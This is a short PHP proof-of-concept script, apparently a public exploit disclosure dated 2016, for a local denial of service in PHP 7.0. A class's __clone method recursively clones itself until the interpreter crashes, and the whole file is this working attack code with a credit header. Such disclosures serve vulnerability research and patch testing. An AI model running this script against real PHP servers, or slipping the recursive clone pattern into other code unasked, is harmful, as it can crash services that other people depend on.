                                    <?php
#############################################################################
## PHP 7.0 Object Cloning Local Denial of Service
## Tested on Windows Server 2012 R2 64bit, English, PHP 7.0
## Date: 26/08/2016
## Local Denial of Service
## Bug discovered by Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
## http://www.black-rose.ml
#############################################################################
class MyCloneableClass
{
	public $obj;
    function __clone()
    {
		$this->obj = clone $this;
		return $this->obj;
    }
}
$obj	= new MyCloneableClass();
$obj2 	= clone $obj;
?>         